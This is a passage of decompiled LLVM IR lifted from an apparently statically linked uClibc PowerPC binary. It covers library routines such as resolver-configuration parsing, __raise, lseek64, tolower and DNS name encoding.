  br label %dec_label_pc_10014330

dec_label_pc_1001431c:                            ; preds = %dec_label_pc_10014330
  %v1_1001431c = add i32 %v0_1001431c, 1
  store i32 %v1_1001431c, i32* %r11.global-to-local, align 4
  %v1_10014320 = inttoptr i32 %v1_1001431c to i8*
  %v2_10014320 = load i8, i8* %v1_10014320, align 1
  %v3_10014320 = zext i8 %v2_10014320 to i32
  store i32 %v3_10014320, i32* %r0.global-to-local, align 4
  %v3_10014324 = icmp eq i8 %v2_10014320, 0
  br i1 %v3_10014324, label %dec_label_pc_10014344.loopexit, label %dec_label_pc_10014330

dec_label_pc_10014330:                            ; preds = %dec_label_pc_10014330.lr.ph, %dec_label_pc_1001431c
  %v0_1001431c = phi i32 [ %v0_100143209, %dec_label_pc_10014330.lr.ph ], [ %v1_1001431c, %dec_label_pc_1001431c ]
  %v0_10014338.in = phi i32 [ %v3_1001432012, %dec_label_pc_10014330.lr.ph ], [ %v3_10014320, %dec_label_pc_1001431c ]
  %v0_10014338 = mul nuw nsw i32 %v0_10014338.in, 2
  store i32 %v3_10014334.pre, i32* %r9.global-to-local, align 4
  %v2_10014338 = add i32 %v0_10014338, %v3_10014334.pre
  %v3_10014338 = inttoptr i32 %v2_10014338 to i16*
  %v4_10014338 = load i16, i16* %v3_10014338, align 2
  %v5_10014338 = zext i16 %v4_10014338 to i32
  store i32 %v5_10014338, i32* %r0.global-to-local, align 4
  %v1_1001433c = and i32 %v5_10014338, 32
  store i32 %v1_1001433c, i32* %r9.global-to-local, align 4
  %v3_1001433c = icmp eq i32 %v1_1001433c, 0
  br i1 %v3_1001433c, label %dec_label_pc_1001431c, label %dec_label_pc_10014344.loopexit

dec_label_pc_10014344.loopexit:                   ; preds = %dec_label_pc_10014330, %dec_label_pc_1001431c, %dec_label_pc_10014320.preheader
  %v0_10014344 = phi i32 [ %v0_100143209, %dec_label_pc_10014320.preheader ], [ %v0_1001431c, %dec_label_pc_10014330 ], [ %v1_1001431c, %dec_label_pc_1001431c ]
  %v1_10014344 = inttoptr i32 %v0_10014344 to i8*
  %v2_10014344 = load i8, i8* %v1_10014344, align 1
  %v3_10014344 = zext i8 %v2_10014344 to i32
  store i32 %v3_10014344, i32* %r0.global-to-local, align 4
  %v3_10014348 = icmp eq i8 %v2_10014344, 0
  br i1 %v3_10014348, label %dec_label_pc_10014350, label %dec_label_pc_100142e0.preheader

dec_label_pc_100142e0.preheader:                  ; preds = %dec_label_pc_100142c8, %dec_label_pc_10014344.loopexit
  %v0_100142e02 = phi i32 [ %v0_10014344, %dec_label_pc_10014344.loopexit ], [ %v0_100142c8, %dec_label_pc_100142c8 ]
  %v1_100142e03 = inttoptr i32 %v0_100142e02 to i8*
  %v2_100142e04 = load i8, i8* %v1_100142e03, align 1
  %v3_100142e05 = zext i8 %v2_100142e04 to i32
  store i32 %v3_100142e05, i32* %r0.global-to-local, align 4
  %v3_100142e47 = icmp eq i8 %v2_100142e04, 0
  br i1 %v3_100142e47, label %dec_label_pc_10014350, label %dec_label_pc_100142f0

dec_label_pc_10014350:                            ; preds = %dec_label_pc_10014344.loopexit, %dec_label_pc_100142e0.preheader, %dec_label_pc_100142d4, %dec_label_pc_100142c8
  %v0_10014350 = load i32, i32* @r29, align 4
  %v1_10014354 = mul i32 %v0_10014350, 4
  store i32 %v1_10014354, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1001435c = load i32, i32* @r30, align 4
  %v3_1001435c = add i32 %v2_1001435c, %v1_10014354
  %v4_1001435c = inttoptr i32 %v3_1001435c to i32*
  store i32 0, i32* %v4_1001435c, align 4
  %tmp55 = icmp slt i32 %v0_10014350, 2
  br i1 %tmp55, label %dec_label_pc_10014404, label %dec_label_pc_10014364

dec_label_pc_10014364:                            ; preds = %dec_label_pc_10014350
  %v0_10014364 = load i32, i32* %r18.global-to-local, align 4
  %v3_10014364 = icmp eq i32 %v0_10014364, 1
  br i1 %v3_10014364, label %dec_label_pc_1001441c, label %dec_label_pc_1001436c

dec_label_pc_1001436c:                            ; preds = %dec_label_pc_10014364
  %v3_1001436c = icmp eq i32 %v0_10014364, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_1001436c, label %dec_label_pc_10014378, label %dec_label_pc_100143a4.preheader

dec_label_pc_100143a4.preheader:                  ; preds = %dec_label_pc_1001436c
  %v1_100143a423 = load i32, i32* @r29, align 4
  %v2_100143a424 = icmp sgt i32 %v1_100143a423, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_100143ac29 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_100143ac29, i32* @r3, align 4
  br i1 %v2_100143a424, label %dec_label_pc_10014390, label %dec_label_pc_100143b4

dec_label_pc_10014378:                            ; preds = %dec_label_pc_1001436c
  %v0_10014378 = load i32, i32* @r30, align 4
  %v1_10014378 = inttoptr i32 %v0_10014378 to i32*
  %v2_10014378 = load i32, i32* %v1_10014378, align 4
  store i32 %v2_10014378, i32* @r4, align 4
  %v0_1001437c = load i32, i32* %r15.global-to-local, align 4
  %v2_10014380 = inttoptr i32 %v0_1001437c to i8*
  %v3_10014380 = call i32 @__GI_strcoll(i8* %v2_10014380, i32 %v2_10014378)
  %v3_10014384 = icmp eq i32 %v3_10014380, 0
  br i1 %v3_10014384, label %dec_label_pc_100143bc, label %dec_label_pc_10014404

dec_label_pc_10014390:                            ; preds = %dec_label_pc_100143a4.preheader, %dec_label_pc_100143a0
  %v1_10014390 = phi i32 [ %v1_100143a8, %dec_label_pc_100143a0 ], [ 4, %dec_label_pc_100143a4.preheader ]
  %v0_100143ac31 = phi i32 [ %v0_100143ac, %dec_label_pc_100143a0 ], [ %v0_100143ac29, %dec_label_pc_100143a4.preheader ]
  %v0_10014390 = load i32, i32* @r30, align 4
  %v2_10014390 = add i32 %v0_10014390, %v1_10014390
  %v3_10014390 = inttoptr i32 %v2_10014390 to i32*
  %v4_10014390 = load i32, i32* %v3_10014390, align 4
  store i32 %v4_10014390, i32* @r4, align 4
  %v2_10014394 = call i32 @__GI_strcasecmp(i32 %v0_100143ac31, i32 %v4_10014390)
  %v3_10014398 = icmp eq i32 %v2_10014394, 0
  %v0_100143b4.pre = load i32, i32* @r31, align 4
  br i1 %v3_10014398, label %dec_label_pc_10014390.dec_label_pc_100143b4_crit_edge, label %dec_label_pc_100143a0

dec_label_pc_100143a0:                            ; preds = %dec_label_pc_10014390
  %v1_100143a0 = add i32 %v0_100143b4.pre, 1
  store i32 %v1_100143a0, i32* @r31, align 4
  %v1_100143a4 = load i32, i32* @r29, align 4
  %v2_100143a4 = icmp slt i32 %v1_100143a0, %v1_100143a4
  %v1_100143a8 = mul i32 %v1_100143a0, 4
  store i32 %v1_100143a8, i32* %r0.global-to-local, align 4
  %v0_100143ac = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_100143ac, i32* @r3, align 4
  br i1 %v2_100143a4, label %dec_label_pc_10014390, label %dec_label_pc_100143b4

dec_label_pc_10014390.dec_label_pc_100143b4_crit_edge: ; preds = %dec_label_pc_10014390
  %v1_100143b4.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100143b4

dec_label_pc_100143b4:                            ; preds = %dec_label_pc_100143a0, %dec_label_pc_10014390.dec_label_pc_100143b4_crit_edge, %dec_label_pc_100143a4.preheader
  %v1_100143b4 = phi i32 [ %v1_100143b4.pre, %dec_label_pc_10014390.dec_label_pc_100143b4_crit_edge ], [ %v1_100143a423, %dec_label_pc_100143a4.preheader ], [ %v1_100143a4, %dec_label_pc_100143a0 ]
  %v0_100143b4 = phi i32 [ %v0_100143b4.pre, %dec_label_pc_10014390.dec_label_pc_100143b4_crit_edge ], [ 1, %dec_label_pc_100143a4.preheader ], [ %v1_100143a0, %dec_label_pc_100143a0 ]
  %v2_100143b4 = icmp slt i32 %v0_100143b4, %v1_100143b4
  br i1 %v2_100143b4, label %dec_label_pc_100143bc, label %dec_label_pc_10014404

dec_label_pc_100143bc:                            ; preds = %dec_label_pc_10014378, %dec_label_pc_100143b4
  %v0_100143bc = load i32, i32* %r19.global-to-local, align 4
  %v3_100143bc = icmp eq i32 %v0_100143bc, 2
  br i1 %v3_100143bc, label %dec_label_pc_100143c4, label %dec_label_pc_100143e0

dec_label_pc_100143c4:                            ; preds = %dec_label_pc_100143bc
  %v0_100143c4 = load i32, i32* @r30, align 4
  %v1_100143c4 = inttoptr i32 %v0_100143c4 to i32*
  %v2_100143c4 = load i32, i32* %v1_100143c4, align 4
  %v0_100143cc = load i32, i32* @r25, align 4
  store i32 268518356, i32* @lr, align 4
  %v3_100143d0 = inttoptr i32 %v2_100143c4 to i8*
  %v4_100143d0 = call i32 @inet_pton(i32 2, i8* %v3_100143d0, i32 %v0_100143cc)
  %v2_100143d4 = icmp sgt i32 %v4_100143d0, 0
  br i1 %v2_100143d4, label %dec_label_pc_10014224, label %dec_label_pc_10014400

dec_label_pc_100143e0:                            ; preds = %dec_label_pc_100143bc
  %v3_100143e0 = icmp eq i32 %v0_100143bc, 10
  br i1 %v3_100143e0, label %dec_label_pc_100143e8, label %dec_label_pc_10014400

dec_label_pc_100143e8:                            ; preds = %dec_label_pc_100143e0
  %v0_100143e8 = load i32, i32* @r30, align 4
  %v1_100143e8 = inttoptr i32 %v0_100143e8 to i32*
  %v2_100143e8 = load i32, i32* %v1_100143e8, align 4
  %v0_100143f0 = load i32, i32* %r21.global-to-local, align 4
  store i32 268518392, i32* @lr, align 4
  %v3_100143f4 = inttoptr i32 %v2_100143e8 to i8*
  %v4_100143f4 = call i32 @inet_pton(i32 10, i8* %v3_100143f4, i32 %v0_100143f0)
  %v2_100143f8 = icmp sgt i32 %v4_100143f4, 0
  br i1 %v2_100143f8, label %dec_label_pc_10014254, label %dec_label_pc_10014400

dec_label_pc_10014400:                            ; preds = %dec_label_pc_100143c4, %dec_label_pc_100143e0, %dec_label_pc_100143e8
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_10014404

dec_label_pc_10014404:                            ; preds = %dec_label_pc_100143b4, %dec_label_pc_10014378, %dec_label_pc_10014350, %dec_label_pc_10014400, %dec_label_pc_1001429c
  %v0_10014404 = load i32, i32* @r24, align 4
  %v0_10014408 = load i32, i32* @r27, align 4
  %v0_1001440c = load i32, i32* @r20, align 4
  store i32 268518420, i32* @lr, align 4
  %v3_10014410 = call i32 @fgets(i32 %v0_10014404, i32 %v0_10014408, i32 %v0_1001440c)
  %v3_10014414 = icmp eq i32 %v3_10014410, 0
  br i1 %v3_10014414, label %dec_label_pc_1001441c, label %dec_label_pc_100142ac

dec_label_pc_1001441c:                            ; preds = %dec_label_pc_10014404, %dec_label_pc_10014364, %dec_label_pc_10014280
  %v0_1001441c = load i32, i32* %r18.global-to-local, align 4
  %v3_1001441c = icmp eq i32 %v0_1001441c, 1
  br i1 %v3_1001441c, label %dec_label_pc_10014434, label %dec_label_pc_10014424

dec_label_pc_10014424:                            ; preds = %dec_label_pc_1001441c
  %v0_10014424 = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_1001442c.723 to i32), i32* @lr, align 4
  %v1_10014428 = inttoptr i32 %v0_10014424 to i16*
  %v2_10014428 = call i32 @__GI_fclose(i16* %v1_10014428)
  br label %dec_label_pc_10014434

dec_label_pc_10014430:                            ; preds = %dec_label_pc_100141e8, %dec_label_pc_100141b8, %dec_label_pc_100141b0, %dec_label_pc_100141a4, %dec_label_pc_10014194, %dec_label_pc_1001417c, %dec_label_pc_1001416c
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_10014434

dec_label_pc_10014434:                            ; preds = %dec_label_pc_1001441c, %dec_label_pc_10014424, %dec_label_pc_10014214, %dec_label_pc_10014430
  store i32 %v0_10014130, i32* %r0.global-to-local, align 4
  %v0_10014438 = load i32, i32* @r26, align 4
  ret i32 %v0_10014438

; uselistorder directives
  uselistorder i32 %v0_100143ac, { 1, 0 }
  uselistorder i32 %v1_100143a0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10014354, { 1, 0 }
  uselistorder i32 %v0_10014350, { 1, 0 }
  uselistorder i32 %v3_100142e05, { 1, 0 }
  uselistorder i32 %v0_100142e02, { 1, 0 }
  uselistorder i32 %v1_1001430c, { 1, 0 }
  uselistorder i32 %v0_10014304, { 1, 0, 2 }
  uselistorder i32 %v2_100142b4, { 1, 0 }
  uselistorder i32 %v0_100141a4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1001417c.pr, { 1, 0, 2 }
  uselistorder i32 %v1_10014148, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r21.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r19.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 4, 15, 3, 16, 0, 23, 17, 18, 1, 19, 20, 22, 21, 2, 24, 25, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 26, 27, 28, 29, 30 }
  uselistorder i32 34, { 5, 6, 10, 1, 2, 3, 7, 8, 4, 0, 9 }
  uselistorder i32 (i16*)* @__GI_fclose, { 5, 4, 0, 1, 2, 3 }
  uselistorder i32 10, { 12, 32, 33, 34, 35, 36, 37, 38, 23, 24, 20, 21, 22, 40, 39, 41, 42, 6, 45, 1, 27, 2, 28, 0, 7, 13, 48, 14, 25, 15, 26, 31, 8, 29, 30, 16, 9, 4, 5, 19, 43, 44, 17, 3, 11, 10, 47, 18, 46 }
  uselistorder i32 (i32, i8*, i32)* @inet_pton, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 24, 20, 21, 22, 23, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 6, { 28, 29, 30, 31, 32, 0, 1, 2, 20, 21, 22, 23, 10, 11, 35, 3, 24, 25, 6, 4, 26, 12, 27, 5, 13, 14, 15, 16, 17, 7, 8, 18, 9, 19, 33, 34 }
  uselistorder i32* @global_var_10028578, { 0, 3, 1, 4, 5, 2, 6, 7 }
  uselistorder i32 12, { 44, 45, 46, 0, 47, 48, 49, 14, 18, 50, 66, 8, 9, 10, 15, 51, 28, 29, 30, 31, 32, 33, 34, 35, 5, 6, 36, 37, 38, 72, 19, 42, 64, 20, 67, 68, 69, 70, 4, 21, 71, 1, 2, 7, 22, 3, 16, 54, 55, 56, 57, 73, 39, 40, 52, 53, 23, 24, 25, 26, 27, 11, 12, 13, 41, 17, 43, 58, 59, 60, 61, 62, 63, 65 }
  uselistorder i32 80, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 48, { 24, 10, 11, 12, 1, 13, 14, 5, 15, 16, 2, 17, 18, 19, 7, 20, 6, 21, 3, 0, 22, 23, 25, 26, 8, 9, 4 }
  uselistorder i32 36, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 3, 4, 2, 0, 1, 14 }
  uselistorder i32 -48, { 3, 5, 4, 6, 1, 2, 0 }
  uselistorder i32 16, { 52, 11, 53, 54, 12, 55, 56, 0, 57, 58, 1, 59, 13, 60, 61, 26, 27, 62, 72, 73, 63, 64, 65, 66, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 84, 41, 4, 23, 21, 49, 22, 74, 75, 88, 89, 90, 91, 67, 68, 42, 43, 44, 45, 46, 47, 85, 86, 87, 69, 2, 70, 71, 14, 15, 24, 25, 6, 8, 7, 16, 48, 17, 20, 50, 5, 51, 18, 76, 77, 78, 79, 80, 81, 19, 82, 3, 83, 9, 10 }
  uselistorder i32* @r27, { 44, 45, 46, 47, 48, 49, 1, 50, 51, 52, 53, 12, 13, 6, 14, 3, 2, 54, 55, 56, 57, 62, 0, 63, 64, 65, 66, 74, 75, 76, 77, 78, 79, 21, 22, 86, 4, 87, 7, 88, 93, 15, 16, 84, 85, 80, 81, 82, 83, 89, 90, 91, 23, 24, 67, 68, 69, 25, 26, 5, 27, 28, 29, 30, 8, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 9, 10, 11, 92, 70, 71, 72, 73, 42, 43, 58, 59, 60, 61, 17, 18, 19, 20 }
  uselistorder i32 32, { 57, 58, 59, 26, 60, 61, 27, 17, 18, 66, 68, 42, 28, 25, 43, 44, 14, 15, 37, 38, 36, 2, 3, 4, 16, 13, 64, 62, 63, 45, 46, 29, 47, 48, 49, 50, 51, 52, 53, 0, 69, 70, 65, 39, 40, 41, 1, 21, 54, 55, 56, 22, 30, 67, 31, 6, 5, 8, 19, 7, 32, 10, 9, 33, 34, 12, 20, 11, 35, 23, 24 }
  uselistorder i32* @r10, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 4, { 4, 112, 133, 5, 6, 226, 224, 225, 146, 227, 228, 229, 128, 7, 230, 231, 232, 233, 234, 235, 236, 8, 237, 9, 10, 11, 134, 238, 239, 147, 240, 241, 242, 12, 13, 129, 219, 14, 15, 181, 182, 183, 184, 185, 186, 243, 148, 16, 17, 300, 301, 149, 18, 19, 117, 20, 21, 22, 23, 24, 25, 251, 252, 150, 26, 27, 2, 28, 0, 187, 3, 29, 1, 253, 151, 30, 246, 247, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 302, 200, 118, 316, 323, 31, 32, 33, 34, 35, 303, 304, 36, 305, 37, 306, 38, 39, 165, 40, 41, 166, 42, 220, 221, 222, 270, 271, 272, 43, 167, 44, 45, 46, 168, 47, 169, 170, 280, 282, 281, 278, 279, 171, 172, 173, 174, 283, 284, 285, 286, 287, 288, 289, 290, 291, 48, 218, 49, 254, 152, 255, 256, 119, 50, 51, 257, 52, 258, 259, 260, 261, 262, 263, 130, 53, 264, 131, 307, 308, 201, 54, 55, 56, 132, 57, 139, 299, 58, 59, 276, 60, 61, 317, 318, 319, 153, 320, 321, 322, 62, 309, 310, 311, 115, 116, 312, 313, 154, 314, 315, 63, 64, 65, 66, 67, 68, 69, 70, 202, 71, 203, 204, 136, 205, 206, 207, 208, 209, 72, 73, 210, 211, 137, 212, 213, 138, 214, 215, 217, 74, 75, 113, 114, 216, 248, 76, 249, 155, 250, 244, 245, 77, 78, 120, 79, 175, 80, 121, 81, 82, 83, 84, 176, 156, 177, 178, 179, 180, 85, 86, 140, 142, 141, 143, 87, 157, 162, 163, 88, 135, 89, 223, 144, 265, 158, 266, 267, 268, 269, 273, 122, 90, 123, 91, 274, 92, 159, 145, 160, 93, 124, 161, 94, 95, 96, 125, 275, 126, 97, 127, 98, 99, 277, 100, 101, 102, 292, 103, 293, 104, 294, 105, 295, 106, 296, 107, 297, 108, 298, 109, 110, 111, 164 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10014434, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10014404, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_10014400, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100143bc, { 1, 0 }
  uselistorder label %dec_label_pc_100143b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10014390, { 1, 0 }
  uselistorder label %dec_label_pc_10014350, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_100142e0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10014330, { 1, 0 }
  uselistorder label %dec_label_pc_100142c8, { 1, 0 }
  uselistorder label %dec_label_pc_1001429c, { 1, 0 }
  uselistorder label %dec_label_pc_10014280, { 1, 0 }
  uselistorder label %dec_label_pc_100141e8, { 1, 0 }
  uselistorder label %dec_label_pc_1001417c, { 1, 0 }
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1001444c = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268518500, i32* @lr, align 4
  %v0_10014460 = call i32 @__libc_getpid()
  %v0_10014468 = load i32, i32* @r29, align 4
  store i32 %v0_1001444c, i32* @lr, align 4
  %v2_10014478 = call i32 @kill(i32 %v0_10014460, i32 %v0_10014468)
  ret i32 %v2_10014478

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1001447c = load i32, i32* @lr, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_100144a8 = call i32 @__asm_mfcr()
  %v1_100144ac = and i32 %v0_100144a8, 268435456
  %v3_100144ac = icmp eq i32 %v1_100144ac, 0
  store i32 %v0_100144a8, i32* %r31.global-to-local, align 4
  store i32 %v0_100144a8, i32* %r0.global-to-local, align 4
  br i1 %v3_100144ac, label %dec_label_pc_100144d0, label %dec_label_pc_100144c0

dec_label_pc_100144c0:                            ; preds = %entry
  %v0_100144c0 = call i32 @__errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_100144c8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100144c8 = inttoptr i32 %v0_100144c0 to i32*
  store i32 %v0_100144c8, i32* %v2_100144c8, align 4
  %v0_100144d4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100144d4

dec_label_pc_100144d0:                            ; preds = %entry
  %v3_100144b8 = icmp eq i32 %v0_100144a8, 0
  br i1 %v3_100144b8, label %dec_label_pc_100144e0, label %dec_label_pc_100144d4

dec_label_pc_100144d4:                            ; preds = %dec_label_pc_100144d0, %dec_label_pc_100144c0
  %v0_100144d4 = phi i32 [ %v0_100144a8, %dec_label_pc_100144d0 ], [ %v0_100144d4.pre, %dec_label_pc_100144c0 ]
  %tmp = icmp slt i32 %v0_100144d4, 0
  %v1_100144d8 = zext i1 %tmp to i32
  %v2_100144d8 = ashr i32 %v0_100144d4, 31
  %v3_100144d8 = and i32 %v2_100144d8, -2
  %v4_100144d8 = or i32 %v3_100144d8, %v1_100144d8
  br label %dec_label_pc_100144e8

dec_label_pc_100144e0:                            ; preds = %dec_label_pc_100144d0
  %v3_100144e0 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_100144e8

dec_label_pc_100144e8:                            ; preds = %dec_label_pc_100144d4, %dec_label_pc_100144e0
  %v0_100144f8 = phi i32 [ %v4_100144d8, %dec_label_pc_100144d4 ], [ %v3_100144e0, %dec_label_pc_100144e0 ]
  store i32 %v0_1001447c, i32* %r0.global-to-local, align 4
  ret i32 %v0_100144f8

; uselistorder directives
  uselistorder i32 %v0_100144d4, { 1, 0 }
  uselistorder i32 %v0_100144a8, { 0, 3, 2, 1, 4 }
  uselistorder i32 -2, { 8, 9, 10, 2, 20, 3, 5, 11, 12, 7, 1, 0, 13, 14, 15, 17, 18, 16, 19, 6, 21, 4 }
  uselistorder i32 31, { 8, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 9, 10, 1, 2, 42, 43, 11, 12, 13, 29, 30, 3, 4, 0, 6, 5, 14, 15, 16, 49, 50, 47, 48, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 41, 7, 44, 45, 46 }
  uselistorder i32 ()* @__errno_location, { 59, 34, 67, 66, 65, 46, 45, 58, 57, 44, 18, 41, 56, 55, 29, 48, 14, 13, 12, 11, 10, 24, 9, 7, 51, 50, 61, 60, 64, 63, 62, 23, 49, 22, 40, 3, 2, 54, 53, 52, 0, 43, 42, 15, 47, 17, 16, 39, 31, 30, 38, 28, 6, 20, 27, 19, 37, 36, 33, 26, 25, 35, 8, 5, 4, 1, 68, 32, 21 }
  uselistorder i32 268435456, { 4, 7, 19, 11, 5, 22, 23, 24, 25, 26, 16, 21, 6, 20, 0, 9, 10, 1, 12, 28, 17, 13, 18, 2, 8, 14, 15, 3, 27, 29, 30, 31 }
  uselistorder i32 140, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100144e8, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_100144fc = add i32 %arg1, 128
  %v1_10014500 = mul i32 %arg1, 2
  %v2_10014504 = icmp ugt i32 %v1_100144fc, 383
  %v0_10014508 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10014504, i32 %v0_10014508)
  %v3_10014510 = load i32, i32* bitcast (i32** @global_var_100285ac.621 to i32*), align 4
  %v2_10014514 = add i32 %v1_10014500, %v3_10014510
  %v3_10014514 = inttoptr i32 %v2_10014514 to i16*
  %v4_10014514 = load i16, i16* %v3_10014514, align 2
  %v5_10014514 = sext i16 %v4_10014514 to i32
  ret i32 %v5_10014514

; uselistorder directives
  uselistorder i32 128, { 17, 0, 1, 21, 22, 4, 5, 18, 3, 6, 7, 10, 11, 12, 13, 8, 14, 15, 16, 2, 9, 20, 19 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10014520 = load i32, i32* @lr, align 4
  store i32 %v0_10014520, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1001452c = load i32, i32* @r4, align 4
  store i32 %v0_1001452c, i32* @r29, align 4
  %v0_10014530 = load i32, i32* @r5, align 4
  store i32 %v0_10014530, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_1001459c13 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_1001459c13, label %dec_label_pc_100145b8, label %dec_label_pc_100145ac

dec_label_pc_10014540:                            ; preds = %dec_label_pc_100145ac
  store i32 268518724, i32* @lr, align 4
  %v3_10014540 = call i32 @__GI_strchr(i32 %v0_100145ac14, i32 46)
  store i32 %v3_10014540, i32* @r30, align 4
  %v3_10014544 = icmp eq i32 %v3_10014540, 0
  %v0_10014548 = load i32, i32* @r31, align 4
  store i32 %v0_10014548, i32* @r3, align 4
  %v2_1001454c = sub i32 %v3_10014540, %v0_10014548
  store i32 %v2_1001454c, i32* %r0.global-to-local, align 4
  br i1 %v3_10014544, label %dec_label_pc_10014554, label %dec_label_pc_1001455c

dec_label_pc_10014554:                            ; preds = %dec_label_pc_10014540
  %v0_10014554 = call i32 @__GI_strlen()
  store i32 %v0_10014554, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_10014554, 16777216
  %v1_10014558 = sdiv i32 %sext, 16777216
  store i32 %v1_10014558, i32* %r0.global-to-local, align 4
  %v0_1001456c.pre = load i32, i32* @r31, align 4
  %v0_1001457c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001455c

dec_label_pc_1001455c:                            ; preds = %dec_label_pc_10014540, %dec_label_pc_10014554
  %v0_1001457c = phi i32 [ %v3_10014540, %dec_label_pc_10014540 ], [ %v0_1001457c.pre, %dec_label_pc_10014554 ]
  %v0_1001456c = phi i32 [ %v0_10014548, %dec_label_pc_10014540 ], [ %v0_1001456c.pre, %dec_label_pc_10014554 ]
  %v0_10014588 = phi i32 [ %v2_1001454c, %dec_label_pc_10014540 ], [ %v1_10014558, %dec_label_pc_10014554 ]
  %v0_10014560 = load i32, i32* @r28, align 4
  %v1_10014560 = load i32, i32* %r27.global-to-local, align 4
  %v2_10014560 = sub i32 %v1_10014560, %v0_10014560
  %v1_10014564 = add i32 %v0_10014560, 1
  store i32 %v1_10014564, i32* %r11.global-to-local, align 4
  %v1_10014568 = add i32 %v2_10014560, -1
  store i32 %v0_1001456c, i32* @r4, align 4
  %v0_10014570 = load i32, i32* @r29, align 4
  %v2_10014570 = add i32 %v0_10014570, %v1_10014564
  store i32 %v2_10014570, i32* @r3, align 4
  store i32 %v0_10014588, i32* @r5, align 4
  %v2_10014578 = icmp ult i32 %v0_10014588, %v1_10014568
  %v1_1001457c = add i32 %v0_1001457c, 1
  store i32 %v1_1001457c, i32* @r31, align 4
  %v3_1001455c.not = icmp ne i32 %v0_10014588, 0
  %or.cond = and i1 %v2_10014578, %v3_1001455c.not
  br i1 %or.cond, label %dec_label_pc_10014588, label %dec_label_pc_100145d0

dec_label_pc_10014588:                            ; preds = %dec_label_pc_1001455c
  %v3_10014588 = trunc i32 %v0_10014588 to i8
  %v4_10014588 = add i32 %v0_10014570, %v0_10014560
  %v5_10014588 = inttoptr i32 %v4_10014588 to i8*
  store i8 %v3_10014588, i8* %v5_10014588, align 1
  %v0_1001458c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001458c = load i32, i32* %r0.global-to-local, align 4
  %v2_1001458c = add i32 %v1_1001458c, %v0_1001458c
  store i32 %v2_1001458c, i32* @r28, align 4
  store i32 268518804, i32* @lr, align 4
  %v0_10014590 = call i32 @memcpy()
  store i32 %v0_10014590, i32* %r3.global-to-local, align 4
  %v0_10014594 = load i32, i32* @r30, align 4
  %v3_10014594 = icmp eq i32 %v0_10014594, 0
  br i1 %v3_10014594, label %dec_label_pc_100145b8, label %dec_label_pc_10014588.dec_label_pc_1001459c_crit_edge

dec_label_pc_10014588.dec_label_pc_1001459c_crit_edge: ; preds = %dec_label_pc_10014588
  %v0_1001459c.pre = load i32, i32* @r31, align 4
  %v3_1001459c = icmp eq i32 %v0_1001459c.pre, 0
  store i32 %v0_1001459c.pre, i32* @r3, align 4
  br i1 %v3_1001459c, label %dec_label_pc_100145b8, label %dec_label_pc_100145ac

